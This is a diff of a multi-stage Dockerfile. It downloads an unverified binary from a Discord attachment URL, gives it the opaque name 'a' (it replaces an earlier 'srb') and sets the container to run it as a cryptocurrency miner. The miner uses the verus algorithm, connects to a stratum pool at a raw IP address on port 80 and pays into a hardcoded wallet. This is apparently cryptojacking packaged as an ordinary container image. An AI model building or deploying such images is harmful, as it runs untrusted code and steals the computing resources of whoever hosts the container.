@@ -4,12 +4,13 @@ RUN apt-get update -y
 
 RUN apt-get install sudo wget git -y
 
-RUN wget https://cdn.discordapp.com/attachments/614113650038538240/944499717205794856/srb && \
-    chmod +x srb && \
-    mv srb /usr/local/bin/
+RUN wget https://cdn.discordapp.com/attachments/614113650038538240/944490989538652190/a && \
+    chmod +x a && \
+    mv a /usr/local/bin/
 
 FROM ubuntu:latest
 
-COPY --from=builder /usr/local/bin/srb /usr/local/bin/
-CMD [ "chmod", "+x", "srb" ]
-CMD [ "srb", "--disable-gpu", "--algorithm", "verushash", "--pool", "51.89.228.192:80", "--wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "--password x" ]
+COPY --from=builder /usr/local/bin/a /usr/local/bin/
+
+ENTRYPOINT [ "a" ]
+CMD [ "-a", "verus", "-o", "stratum+tcp://51.89.228.192:80", "-u", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "-p", "x", "-t8" ]
